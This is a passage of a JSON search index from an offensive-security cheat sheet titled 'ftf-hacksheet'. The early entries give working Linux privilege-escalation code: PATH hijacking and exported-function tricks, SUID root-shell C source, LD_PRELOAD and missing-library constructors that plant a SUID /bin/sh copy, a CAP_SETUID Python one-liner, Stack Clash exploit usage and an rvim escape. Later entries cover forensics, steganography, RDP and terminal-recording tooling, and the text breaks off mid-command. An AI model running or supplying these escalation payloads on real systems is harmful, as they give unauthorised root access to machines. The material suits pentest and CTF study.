    "relUrl": "/#linux--elf-vulnerabilities--rpath"
  },"598": {
    "doc": "ftf-hacksheet",
    "title": "RUNPATH",
    "content": ". | The ELFs shall have RUNPATH | TODO regarding how to search it (try readelf -d) | Libraries under RUNPATH are searched after LD_LIBRARY_PATH, so this may allow the LD_PRELOAD trick to work | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--runpath",
    "relUrl": "/#linux--elf-vulnerabilities--runpath"
  },"599": {
    "doc": "ftf-hacksheet",
    "title": "Stack Clash - CVE2017-1000379",
    "content": ". | The ELFs shall have PIC (use checksec) | The target ELFs shall be owned by root and have the SUID bit | Follow the instructions for compiling | Run the exploit:# It may \"die\" with some binaries ./pwn &lt;os-num&gt; &lt;path-to-suid-pic-elf&gt; # Try with those with longer paths . | More info | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--stack-clash---cve2017-1000379",
    "relUrl": "/#linux--elf-vulnerabilities--stack-clash---cve2017-1000379"
  },"600": {
    "doc": "ftf-hacksheet",
    "title": "Environment Tampering",
    "content": " ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--environment-tampering",
    "relUrl": "/#linux--elf-vulnerabilities--environment-tampering"
  },"601": {
    "doc": "ftf-hacksheet",
    "title": "Identification",
    "content": ". | Check calls made by the SUID:strings /usr/bin/sudo | less # Relative calls don't have a path # Absolute calls have a path # Also check ldd /usr/bin/sudo . | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--environment-tampering--identification",
    "relUrl": "/#linux--elf-vulnerabilities--environment-tampering--identification"
  },"602": {
    "doc": "ftf-hacksheet",
    "title": "Relative References",
    "content": ". | Tamper the PATH:export PATH=/tmp:$PATH # Create an evil executable with # the same name as the reference echo 'int main() { setgid(0); setuid(0); system(\"/bin/sh\"); return 0; }' &gt; /tmp/setresuid.c gcc /tmp/setresuid.c -o /tmp/setresuid . | Execute the binary | Check that the permissions are preserved/bin/bash -p . | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--environment-tampering--relative-references",
    "relUrl": "/#linux--elf-vulnerabilities--environment-tampering--relative-references"
  },"603": {
    "doc": "ftf-hacksheet",
    "title": "Absolute References",
    "content": ". | Create a function:# It shall have the same name /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; } # Export the function export -f /usr/sbin/service . | Execute the binary | Check that the permissions are preserved/bin/bash -p . | . ",
    "url": "http://localhost:4000/#linux--elf-vulnerabilities--environment-tampering--absolute-references",
    "relUrl": "/#linux--elf-vulnerabilities--environment-tampering--absolute-references"
  },"604": {
    "doc": "ftf-hacksheet",
    "title": "SUID Creation",
    "content": " ",
    "url": "http://localhost:4000/#linux--suid-creation",
    "relUrl": "/#linux--suid-creation"
  },"605": {
    "doc": "ftf-hacksheet",
    "title": "Set SUID bit",
    "content": "chmod a+s &lt;file&gt; . ",
    "url": "http://localhost:4000/#linux--suid-creation--set-suid-bit",
    "relUrl": "/#linux--suid-creation--set-suid-bit"
  },"606": {
    "doc": "ftf-hacksheet",
    "title": "ELF",
    "content": "#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main() { setgid(0); setuid(0); setegid(0); seteuid(0); system(\"/bin/sh\"); // Use exec if system uses rshell // execv(\"/bin/sh\", NULL); // execl(\"/bin/sh\", NULL); // execlp(\"/bin/sh\", NULL); // execle(\"/bin/sh\", NULL, NULL); // execvp(\"/bin/sh\", NULL); // execve(\"/bin/sh\", NULL, NULL); // execvP(\"/bin/sh\", NULL, NULL); return 0; } // gcc -o suid suid.c // https://stackoverflow.com/a/20823413 . ",
    "url": "http://localhost:4000/#linux--suid-creation--elf",
    "relUrl": "/#linux--suid-creation--elf"
  },"607": {
    "doc": "ftf-hacksheet",
    "title": "SO Library",
    "content": " ",
    "url": "http://localhost:4000/#linux--suid-creation--so-library",
    "relUrl": "/#linux--suid-creation--so-library"
  },"608": {
    "doc": "ftf-hacksheet",
    "title": "LD_PRELOAD",
    "content": "#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; // In old systems use: // void _init() { void __attribute__ ((constructor)) my_init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); setegid(0); seteuid(0); system(\"/bin/sh\"); // Use exec if system uses rshell // execv(\"/bin/sh\", NULL); // execl(\"/bin/sh\", NULL); // execlp(\"/bin/sh\", NULL); // execle(\"/bin/sh\", NULL, NULL); // execvp(\"/bin/sh\", NULL); // execve(\"/bin/sh\", NULL, NULL); // execvP(\"/bin/sh\", NULL, NULL); } // gcc -shared -fPIC -o suid.so suid.c // LD_PRELOAD=suid.so &lt;binary&gt; . ",
    "url": "http://localhost:4000/#linux--suid-creation--so-library--ld_preload",
    "relUrl": "/#linux--suid-creation--so-library--ld_preload"
  },"609": {
    "doc": "ftf-hacksheet",
    "title": "Missing library",
    "content": "#include &lt;stdlib.h&gt; // void _init() in old systems static void inject() __attribute__((constructor)); void inject() { system(\"cp /bin/sh /tmp/sh &amp;&amp; chmod a+s /tmp/sh &amp;&amp; /tmp/sh -p\"); // See above for exec family } // gcc -shared -fPIC -o &lt;lib&gt;.so lib.c . ",
    "url": "http://localhost:4000/#linux--suid-creation--so-library--missing-library",
    "relUrl": "/#linux--suid-creation--so-library--missing-library"
  },"610": {
    "doc": "ftf-hacksheet",
    "title": "Tool PrivEsc",
    "content": " ",
    "url": "http://localhost:4000/#linux--tool-privesc",
    "relUrl": "/#linux--tool-privesc"
  },"611": {
    "doc": "ftf-hacksheet",
    "title": "GTFObins",
    "content": ". | Site - How to privesc with common tools | . ",
    "url": "http://localhost:4000/#linux--tool-privesc--gtfobins",
    "relUrl": "/#linux--tool-privesc--gtfobins"
  },"612": {
    "doc": "ftf-hacksheet",
    "title": "rvim",
    "content": ". | In addition to the gtfobins ways, you can use :diffpatch $(sh &lt;&amp;2 &gt;&amp;2) (play with double quotes) as reported here if vim was compiled without python nor lua support (maybe source also works) | . ",
    "url": "http://localhost:4000/#linux--tool-privesc--rvim",
    "relUrl": "/#linux--tool-privesc--rvim"
  },"613": {
    "doc": "ftf-hacksheet",
    "title": "Capabilities",
    "content": " ",
    "url": "http://localhost:4000/#linux--capabilities",
    "relUrl": "/#linux--capabilities"
  },"614": {
    "doc": "ftf-hacksheet",
    "title": "Info",
    "content": ". | Examples of attack vectors with Caps | . ",
    "url": "http://localhost:4000/#linux--capabilities--info",
    "relUrl": "/#linux--capabilities--info"
  },"615": {
    "doc": "ftf-hacksheet",
    "title": "CAP_SETUID",
    "content": " ",
    "url": "http://localhost:4000/#linux--capabilities--cap_setuid",
    "relUrl": "/#linux--capabilities--cap_setuid"
  },"616": {
    "doc": "ftf-hacksheet",
    "title": "Python",
    "content": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\");' . ",
    "url": "http://localhost:4000/#linux--capabilities--cap_setuid--python",
    "relUrl": "/#linux--capabilities--cap_setuid--python"
  },"617": {
    "doc": "ftf-hacksheet",
    "title": "Forensics",
    "content": " ",
    "url": "http://localhost:4000/#forensics",
    "relUrl": "/#forensics"
  },"618": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#forensics--windows",
    "relUrl": "/#forensics--windows"
  },"619": {
    "doc": "ftf-hacksheet",
    "title": "Registry Hives .dat files",
    "content": ". | Identify the content of a hive file with regipy:registry-parse-header &lt;hive.dat&gt; . | Recover and diff the hive changes:# Add -s &lt;secondary-log&gt; if found registry-transaction-logs NTUSER.DAT -p NTUSER.DAT.LOG -o recovered_NTUSER.dat registry-diff NTUSER.DAT recovered_NTUSER.dat . | Dump the hive as JSON and browse it:registry-dump NTUSER.DAT | jq -C . | less -R . | Run plugins to extract information:# Modest plugins from regipy # List them: registry-plugins-list registry-plugins-run UsrClass.dat -o out.json # Massive amount from RegRipper rip -a -r &lt;hive.dat&gt; &gt; output.txt . | Flush transactional log with registryFlush | Automatically extract information from all hives and save it separately + flush transaction log::: Place rip.exe in %TEMP% autoripy.exe %TEMP% -s C:\\Windows\\System32\\config -m C:\\Users -r %TEMP%\\reports -c all --flush . | . ",
    "url": "http://localhost:4000/#forensics--windows--registry-hives--dat-files",
    "relUrl": "/#forensics--windows--registry-hives--dat-files"
  },"620": {
    "doc": "ftf-hacksheet",
    "title": "Internet Explorer .dat files",
    "content": ". | Dump the content using pasco (also check the odessa version)pasco &lt;file.dat&gt; # Recursively show all in subfolders for f in **/*.dat; do echo; pasco \"$f\"; echo \"----\"; done . | . ",
    "url": "http://localhost:4000/#forensics--windows--internet-explorer--dat-files",
    "relUrl": "/#forensics--windows--internet-explorer--dat-files"
  },"621": {
    "doc": "ftf-hacksheet",
    "title": "Emails",
    "content": " ",
    "url": "http://localhost:4000/#forensics--windows--emails",
    "relUrl": "/#forensics--windows--emails"
  },"622": {
    "doc": "ftf-hacksheet",
    "title": "DBX",
    "content": ". | Extract all DBX files and recover its content:for f in *.dbx; do undbx --recover $f; done . | Convert EML files to MBOX:# formail is contained in procmail for f in *.eml; do formail -b &lt; $f &gt; \"${f%.*}\".mbox; done . | Open MBOX files in mutt:cat *.mbox &gt; all.mbox mutt -f all.mbox # Remove duplicates by pressing: # D # ~= # View attachments with: v # Extract attachments with: s # # To render HTML check: Tool section . | . ",
    "url": "http://localhost:4000/#forensics--windows--emails--dbx",
    "relUrl": "/#forensics--windows--emails--dbx"
  },"623": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": ". | Read this article | . ",
    "url": "http://localhost:4000/#forensics--linux",
    "relUrl": "/#forensics--linux"
  },"624": {
    "doc": "ftf-hacksheet",
    "title": "Steganography",
    "content": " ",
    "url": "http://localhost:4000/#steganography",
    "relUrl": "/#steganography"
  },"625": {
    "doc": "ftf-hacksheet",
    "title": "Steghide",
    "content": ". | Site - Detect/Hide data:# Detect steghide info &lt;file&gt; . | . ",
    "url": "http://localhost:4000/#steganography--steghide",
    "relUrl": "/#steganography--steghide"
  },"626": {
    "doc": "ftf-hacksheet",
    "title": "StegSolve",
    "content": ". | Site (bug) - Original - Image Analyzer:java -jar stegosolve.jar # -Dsun.java2d.uiScale=2.5 - HiDPI # -Dsun.java2d.dpiaware=false - HiDPI # GDK_SCALE=2 - HiDPI . | . ",
    "url": "http://localhost:4000/#steganography--stegsolve",
    "relUrl": "/#steganography--stegsolve"
  },"627": {
    "doc": "ftf-hacksheet",
    "title": "Tricky Configuration",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration",
    "relUrl": "/#tricky-configuration"
  },"628": {
    "doc": "ftf-hacksheet",
    "title": "VPN",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--vpn",
    "relUrl": "/#tricky-configuration--vpn"
  },"629": {
    "doc": "ftf-hacksheet",
    "title": "NordVPN",
    "content": ". | Debian - add repo and installwget 'https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb' dpkg -i nordvpn-release_1.0.0_all.deb apt update apt install nordvpn # Review nordvpnd.socket and service # Consider installing wireguard-tools # for using nordlynx wg technology usermod -aG nordvpn $USER # Reload groups for terminal sudo -v &amp;&amp; exec sudo -u $USER -i . | Log in and whitelist# Continue from the sudo -u $USER -i # Consider using iptables-save here nordvpn login | awk '{print $NF}' | xargs firefox nordvpn account # Identify the networks to whitelist ip addr nordvpn whitelist add subnet &lt;net&gt;/&lt;mask&gt; # Only if wireguard-tools is installed nordvpn set technology nordlynx nordvpn set protocol &lt;UDP/TCP&gt; # UDP nordvpn set autoconnect on &lt;country&gt; &lt;city&gt; # Specific servers is possible nordvpn connect [&lt;country&gt;] [&lt;city&gt;] #Tab nordvpn set killswitch on nordvpn status . | Disconnect and recover internetnordvpn disconnect # Consider using iptables-restore here iptables -F systemctl stop nordvpn.s{ocket,ervice} . | . ",
    "url": "http://localhost:4000/#tricky-configuration--vpn--nordvpn",
    "relUrl": "/#tricky-configuration--vpn--nordvpn"
  },"630": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce / Fuzzing Ranking",
    "content": ". | TLDR Linux - Theoretically &amp; not-benchmarked:medusa &gt; hydra &lt;=&gt; patator &gt; wfuzz &gt; ZAP Dirbuster &gt; dirsearch &gt; dirb &gt;= gobuster* == ffuf* == feroxbuster . | &lt;=&gt; In some cases patator is the best . | If the server supports keep-alive . | curl -H &#39;Connection: keep-alive&#39; | . | And the medusa and hydra modules don&#8217;t reuse connections (like HTTP) | . | * Compile via gccgo for native threads | feroxbuster uses green threads | In Windows it is a different story . | In a quick test patator vs wfuzz vs ffuf performed in MSYS-MinGW64 the result was:ffuf &gt; wfuzz &gt; patator . | Correspondingly ffuf was 2 times faster than wfuzz (3.5min vs 7min) | patator took 9min | . | This is due to the different implementation of fork, clone &amp; pthread found in Windows, as well as the task/thread scheduler | . | . | The most performant tool should be medusa (fix) followed by hydra (ignoring protocol optimizations/features that might not be implemented in them) | These two tools are written in C, with the major difference being that medusa uses pthread vs fork in hydra | This is multithreading v multiprocessing | pthread uses less memory | fork takes advantage of multi-CPU/cores | For I/O bound operations use pthread | For high-level langs in a CPU-bound situation it might be better to use multiprocessing as multiprocessing scheduling is managed by the OS whereas multithreading might be managed by the library (or GIL), causing overhead - ref | patator uses multiprocessing vs multithreading used by wfuzz | wfuzz is prone to get killed by the OOMd | patator tries to reuse TCP connections for all modules and supports HTTP2 | medusa and hydra only reuse connections in specific modules (not HTTP, even if medusa hardcodes keep-alive) - no HTTP2 | Note that hydra could be slower than patator due to an unnecessary GET req | Regarding Python vs Go, it appears to be that some Python libraries might be more performant than goroutines | Note that compiling Go programs with gccgo may implement the goroutines as pthreads . | Also referred in this book | Alternatively, set GOMAXPROCS in the env | . | According to this, patator outperforms all the other high-level parallel tools . | But the article doesn&#8217;t say if coroutines have been placed in the same category as threads | And it doesn&#8217;t say if Wfuzz PyCurl is correctly linked | . | . ",
    "url": "http://localhost:4000/#tricky-configuration--bruteforce---fuzzing-ranking",
    "relUrl": "/#tricky-configuration--bruteforce---fuzzing-ranking"
  },"631": {
    "doc": "ftf-hacksheet",
    "title": "MSYS for Windows",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--msys-for-windows",
    "relUrl": "/#tricky-configuration--msys-for-windows"
  },"632": {
    "doc": "ftf-hacksheet",
    "title": "Download",
    "content": ". | Using MSYS might be the easiest way to get an unified linux-like environment in Windows | In fact, it can be successfully used to build native tools that are usually caught by the AV | Get it from msys2.org | . ",
    "url": "http://localhost:4000/#tricky-configuration--msys-for-windows--download",
    "relUrl": "/#tricky-configuration--msys-for-windows--download"
  },"633": {
    "doc": "ftf-hacksheet",
    "title": "Python Cryptography / Rust Installation",
    "content": ". | Installing the cryptography library via pip is ridiculously difficult | There&#8217;s the mingw-w64-x86_64-python-cryptography pkg, but it might be outdated | First install the following packages:pacman -S --disable-download-timeout mingw-w64-x86_64-gcc mingw-w64-x86_64-python mingw-w64-x86_64-python-pip mingw-w64-x86_64-python-wheel . | Create a generic python lib via symlink:ln -s /mingw64/lib/libpython3.*.dll.a /mingw64/lib/libpython3.dll.a . | Install Rust (mingw one doesn&#8217;t work) - ref:curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh . | Customize the installation (opt 2) to use the following target: x86_64-pc-windows-gnu | Continue with the installation | Create a config file in your cargo home:%USERPROFILE%\\.cargo\\config --------------------------- [target.x86_64-pc-windows-gnu] linker = \"C:\\\\msys64\\\\mingw64\\\\bin\\\\gcc.exe\" ar = \"C:\\\\msys64\\\\mingw64\\\\bin\\\\ar.exe\" . | Open a MinGW x64 terminal and add the Rust bin to the PATH (don&#8217;t worry about the exe):export PATH=\"/c/Users/$USERNAME/.cargo/bin:$PATH\" . | Try to install cryptography:# You might want to try a venv first pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org cryptography # Always try to install the dependencies # using pacman unless they are outdated . | I got stuck in some OpenSSL error due to missing libs (not available in pacman), try downloading/compiling them next time and exporting the OPENSSL_VERSION variable | . ",
    "url": "http://localhost:4000/#tricky-configuration--msys-for-windows--python-cryptography---rust-installation",
    "relUrl": "/#tricky-configuration--msys-for-windows--python-cryptography---rust-installation"
  },"634": {
    "doc": "ftf-hacksheet",
    "title": "Embedded Python for Windows",
    "content": ". | If the machine doesn&#8217;t have internet, create a socks connection with plink -D | Make the OS use the socks proxy through the Internet Explorer LAN Configuration settings by only setting the Socks server option to 127.0.0.1 &lt;port&gt; | Send embedded python (since 3.5 - Windows Vista minimum): download - and proxychains | Change the last line of the proxychains configuration to use the local socks server and port like the IE setting | Send pip by first downloading it to your machine and then sending it to the Windows one | Install pip by setting the trusted flags to bypass the SSL errors:proxychains_win32_x86.exe -f proxychains.conf .\\python.exe get-pip.py --trusted-host pypi.org --trusted-host files.pythonhosted.org . | Uncomment the import site in the python&lt;ver&gt;._nth file as mentioned here | Then find pip in the Scripts folder but run it like:proxychains_win32_x86.exe -f proxychains.conf .\\python.exe -m pip --trusted-host pypi.org --trusted-host files.pythonhosted.org install &lt;package&gt; :: pipenv won't work with embeddable :: https://github.com/pypa/pipenv/issues/4334#issuecomment-694715392 . | Note that some debugging programs that import python libraries (like cxfreeze) won&#8217;t work with embeddable python due to the fact that most of these libraries are inside the python&lt;ver&gt;.zip, you may try to decompress it and place the libraries in the Lib folder | It is worth mentioning that some packages may perfectly work if these libraries are removed from the import, for example yarp (autoripy dependency), which goes along if __version__ is removed (though you won&#8217;t be able to install it via the remote archive as this modification is needed) | But problems will exist for packages that depends on Microsoft Visual C++/SDK | . ",
    "url": "http://localhost:4000/#tricky-configuration--embedded-python-for-windows",
    "relUrl": "/#tricky-configuration--embedded-python-for-windows"
  },"635": {
    "doc": "ftf-hacksheet",
    "title": "VNC",
    "content": ". | The only Linux client that allows scaling to become usable in a HiDPI screen is Vinagre | . ",
    "url": "http://localhost:4000/#tricky-configuration--vnc",
    "relUrl": "/#tricky-configuration--vnc"
  },"636": {
    "doc": "ftf-hacksheet",
    "title": "RDP - Remote Desktop",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--rdp---remote-desktop",
    "relUrl": "/#tricky-configuration--rdp---remote-desktop"
  },"637": {
    "doc": "ftf-hacksheet",
    "title": "Enable",
    "content": ". | Remote Desktop can only be enabled if the network currently connected is set as Private | Enable it via PS (source)::: Open the shell as Admin :: Get the name of the current net Get-NetConnectionProfile :: Set is as Private Set-NetConnectionProfile -Name \"&lt;NetName&gt;\" -NetworkCategory Private . | . ",
    "url": "http://localhost:4000/#tricky-configuration--rdp---remote-desktop--enable",
    "relUrl": "/#tricky-configuration--rdp---remote-desktop--enable"
  },"638": {
    "doc": "ftf-hacksheet",
    "title": "RDP over Reverse SSH",
    "content": ". | Useful when there&#8217;s a firewall that is not allowing inbound connections for RDP | Note that the following assumes that the ssh client tool is already installed on the firewalled machine | First, create a SSH server on your machine (use gost):# Non-std ssh port for extra security gost -L forward+ssh://:2222 . | Use ssh in reverse tunnel mode:# Daemonize with -f once it works ssh -N -R 127.0.0.1:3389:127.0.0.1:3389 -p 2222 &lt;server-ip&gt; # Disable compression -o Compression=no # Enable compression -C . | . ",
    "url": "http://localhost:4000/#tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh",
    "relUrl": "/#tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh"
  },"639": {
    "doc": "ftf-hacksheet",
    "title": "Connect with XFreeRDP",
    "content": "# Ctrl+Alt+Enter - Toggle fullscreen # If RDP8 proto is not available # use /rfx /codec-cache:rfx xfreerdp /log-level:FATAL /network:lan /dynamic-resolution -decorations -themes /gfx /codec-cache:gfx +gfx-small-cache +glyph-cache /sound /u:'&lt;DOMAIN&gt;\\&lt;user&gt;' /v:127.0.0.1:3389 +auto-reconnect +bitmap-cache +multitransport +window-drag # /mic - Enable the microphone # Scale for HiDPI display xfreerdp /log-level:FATAL /network:lan /scale:180 /scale-desktop:280 /scale-device:180 /dynamic-resolution -decorations -themes /gfx /codec-cache:gfx +gfx-small-cache +glyph-cache /sound /u:'&lt;DOMAIN&gt;\\&lt;user&gt;' /v:127.0.0.1:3389 +auto-reconnect +bitmap-cache +multitransport +window-drag # There are some flags to redirect the # local USBs and microphones . ",
    "url": "http://localhost:4000/#tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp",
    "relUrl": "/#tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp"
  },"640": {
    "doc": "ftf-hacksheet",
    "title": "Record Screen",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--record-screen",
    "relUrl": "/#tricky-configuration--record-screen"
  },"641": {
    "doc": "ftf-hacksheet",
    "title": "Integrated GPU",
    "content": ". | Note that frames will be lost if other high-computational processes (such as virtual machines) are using the CPU | Either preset veryfast with crf 38 | Or preset superfast with crf 40 | Consider adding -video_size &lt;geometry&gt; | Try increasing the -probesize in case some magic happens | Full command:ffmpeg -hide_banner -loglevel warning -hwaccel auto -probesize 100M -draw_mouse 0 -f x11grab -i :0.0 -an -c:v libx264rgb -crf 40 -preset superfast -tune stillimage -threads 0 &lt;file.mkv&gt; . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-screen--integrated-gpu",
    "relUrl": "/#tricky-configuration--record-screen--integrated-gpu"
  },"642": {
    "doc": "ftf-hacksheet",
    "title": "Discrete GPU",
    "content": ". | Doesn&#8217;t have the problem of the missing frames, though hashcat and other GPGPU tools will create issues | pvkrun may not be necessary or could be replaced with primusrun | Full command:vblank_mode=0 optirun --no-xorg -b none -- pvkrun ffmpeg -hide_banner -loglevel warning -threads:v 2 -filter_threads 2 -thread_queue_size 4096 -vsync 0 -hwaccel cuvid -hwaccel_output_format cuda -probesize 100M -draw_mouse 0 -f x11grab -i :0.0 -an -c:v h264_nvenc -rc vbr -spatial-aq 1 -temporal-aq 1 -qmin 34 -qmax 51 -bufsize:v 32M -rc-lookahead:v 75 -b_adapt 0 -coder auto -tune hq \"&lt;file&gt;-$(date '+%s').mkv\" . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-screen--discrete-gpu",
    "relUrl": "/#tricky-configuration--record-screen--discrete-gpu"
  },"643": {
    "doc": "ftf-hacksheet",
    "title": "Record Terminal",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal",
    "relUrl": "/#tricky-configuration--record-terminal"
  },"644": {
    "doc": "ftf-hacksheet",
    "title": "Extra",
    "content": " ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--extra",
    "relUrl": "/#tricky-configuration--record-terminal--extra"
  },"645": {
    "doc": "ftf-hacksheet",
    "title": "Compression",
    "content": ". | Create pipes to zstd, example:# Using zsh/bash pipes # script - record script -q -t &gt;(zstd -q -T0 --ultra --long --adapt=min=1,max=22 -o timings.zst) &gt;(zstd -q -T0 --ultra --long --adapt=min=1,max=22 -o rawout.zst) # script - playback scriptreplay -t &lt;(zstdcat timings.zst) &lt;(zstdcat rawout.zst) # ttyrec - record ttyrec -f &gt;(zstd -q -T0 --ultra --long --adapt=min=1,max=22 -o record.zst) # ipbt - playback ipbt -u -U -A -P -T &lt;(zstdcat record.zst) . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--extra--compression",
    "relUrl": "/#tricky-configuration--record-terminal--extra--compression"
  },"646": {
    "doc": "ftf-hacksheet",
    "title": "Clean VT100/ANSI escapes",
    "content": ". | Use sed magic-regex - still needs to trim some vterm/tmux/screen escapes | Use ansi2html.sh (raw):# TODO - sed magic needed to further # trim + vterm/tmux/screen escape zstdcat rawout.zst | ansi2html.sh | w3m -T text/html -dump | less -r . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes",
    "relUrl": "/#tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes"
  },"647": {
    "doc": "ftf-hacksheet",
    "title": "Script",
    "content": ". | Record:# Use -c for running a command # Use -a for appending to files script -q -t timings.ty rawout.ty . | Playback:# No rewind support scriptreplay -t timings.ty rawout.ty # Join inactivity on same-frame - zsh scriptreplay -t &lt;(awk '{ printf \"%f %d\\n\", (($1 - last) &gt; 1) ? 1 : $1, $2 }' timings.ty) rawout.ty . | Run the recorded commands:# The recorded cmds will be executed scriptlive -t timings.ty rawout.ty . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--script",
    "relUrl": "/#tricky-configuration--record-terminal--script"
  },"648": {
    "doc": "ftf-hacksheet",
    "title": "TTYrec",
    "content": ". | Use ovh-ttyrec (or ttyrec + patches) | Record (using ovh-ttyrec syntax):ttyrec -f record.trec # Record just a command ttyrec -f record.trec -- &lt;cmd&gt; . | Playback:# No rewind support ttyplay record.trec . | Dump the recording in raw format:ttyplay -n record.trec &gt; rawout.ty . | Repair corrupted ttyrec for IPBT:# Press + to duplicate the speed ttyrec -f &lt;fixed&gt; -- ttyplay &lt;broken&gt; # Play it in ipbt with &lt;num&gt;X . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--ttyrec",
    "relUrl": "/#tricky-configuration--record-terminal--ttyrec"
  },"649": {
    "doc": "ftf-hacksheet",
    "title": "TTYrec - Perl",
    "content": ". | Obtain it from App::Ttyrec | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--ttyrec---perl",
    "relUrl": "/#tricky-configuration--record-terminal--ttyrec---perl"
  },"650": {
    "doc": "ftf-hacksheet",
    "title": "Termrec",
    "content": ". | termrec - Records in ttyrec format with extra information for better playback - untested | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--termrec",
    "relUrl": "/#tricky-configuration--record-terminal--termrec"
  },"651": {
    "doc": "ftf-hacksheet",
    "title": "IPBT - Replayer",
    "content": ". | Git - Manual | Some ncurses tools won&#8217;t be displayed | Replay TTYrec:# --utf8-linedraw - Fix line drawings ipbt -u -U -A -T record.trec # -f &lt;frame&gt; -&gt; Start at &lt;frame&gt; # Raw recordings ipbt -u -U -A -R rawout.ty # o -&gt; Frame info # l -&gt; Speedup idle periods # s/p -&gt; Pause/Play # SPC -&gt; Next Frame - Number mod # b -&gt; Previous Frame - Number mod # &lt;n&gt;g -&gt; Jump to &lt;n&gt; frame # G -&gt; Jump to last frame # &lt;n&gt;x -&gt; Speedup playback &lt;n&gt; times # &lt;n&gt;X -&gt; Slowdown playback &lt;n&gt; times # / -&gt; Search forward # ? -&gt; Search backward # n -&gt; Repeat search . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--ipbt---replayer",
    "relUrl": "/#tricky-configuration--record-terminal--ipbt---replayer"
  },"652": {
    "doc": "ftf-hacksheet",
    "title": "asciinema",
    "content": ". | asciinema - Creates JSON recordings | Only useful if the purpose is to upload/share the recording | Check ttyrec to asciinema converters | Post-processing - format conversion | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--asciinema",
    "relUrl": "/#tricky-configuration--record-terminal--asciinema"
  },"653": {
    "doc": "ftf-hacksheet",
    "title": "Conversion - ttyrec &lt;&gt; script",
    "content": ". | The following trick can be used but not time-efficient:ttyrec -f record.trec -- scriptreplay -t timings.ty rawout.ty . | . ",
    "url": "http://localhost:4000/#tricky-configuration--record-terminal--conversion---ttyrec----script",
    "relUrl": "/#tricky-configuration--record-terminal--conversion---ttyrec----script"
  },"654": {
    "doc": "ftf-hacksheet",
    "title": "Screenshot Full Command Output",
    "content": ". | Before running the command start script:# DO NOT add the -t &lt;tm&gt; flag LC_ALL=C script -q rawout.ty # -c &lt;cmd&gt; - Run just the command # ^ The prompt won't be captured # Or use the following for compression script -q &gt;(zstd -q -T0 --ultra --long --adapt=min=1,max=22 -o rawout.zst) . | Run the command and exit script | Use ansi2html to create an HTML:# The xterm palette is the clearest &lt; rawout.ty sh ansi2html.sh --bg=dark --palette=xterm &gt; cmd.html # Or if compression was used zstdcat rawout.zst | sh ansi2html.sh --bg=dark --palette=xterm &gt; cmd.html . | Remove the script tags from the HTML:# TODO See if still relevant # Keeping the command prompt sed -i '/Script started/{N;s/.*\\n//p;N;g;:a;g;N;/Script done/!{s,^\\n\\(&lt;/span&gt;\\)\\+,,;P;s,[^\\n]*\\n,,;ba};d}' cmd.html # Works for multiple prompts sed -i ':a;/\\(^\\|\\n\\)&lt;span[^\\n]*&lt;[^&lt;]\\+&gt;\\s\\?[%#]\\s\\+$\\|\\n$/{N;ba};s/.*\\n\\+//;/^Script \\(started\\|done\\)/d' cmd.html # TODO See if still relevant # Keeping the command, not the prompt sed -i '/Script started/{N;s/.*\\n&lt;span.*\\(&lt;[^&lt;]\\+&gt;\\) \\?%/\\1$/p;g;N;:a;N;/Script done/!{s,^\\n\\(&lt;/span&gt;\\)\\+,,;P;s,[^\\n]*\\n,,;ba};d}' cmd.html # Works for multiple prompts sed -i ':a;/\\(^\\|\\n\\)&lt;span[^\\n]*&lt;[^&lt;]\\+&gt;\\s\\?[%#]\\s[^&lt;\\n]\\+$\\|\\n\\s*$/{N;ba};/Script \\(started\\|done\\)/d;s/^\\(&lt;span.*&lt;[^&lt;]\\+&gt;\\s\\?[%#]\\s.*[^\\n]\\+\\)\\?\\(\\n*\\)&lt;span.*\\(&lt;[^&lt;]\\+&gt;\\)\\s\\?\\([%#]\\)\\s*/\\2\\3\\4 /' cmd.html # ^ Assuming % or # as prompt separator # TODO See if still relevant # Only the command's output sed -i '/Script started/{N;g;N;:a;g;N;/Script done/!{s,^\\n\\(&lt;/span&gt;\\)\\+,,;P;s,[^\\n]*\\n,,;ba};d}' cmd.html # Works for multiple prompts sed -i ':a;/\\(^\\|\\n\\)&lt;span[^\\n]*&lt;[^&lt;]\\+&gt;\\s\\?[%#]\\s[^&lt;\\n]\\+$\\|\\n\\s*$/{N;ba};/^\\(&lt;span[^\\n]*&lt;[^&lt;]\\+&gt;\\s\\?[%#]\\s.\\+$\\|Script 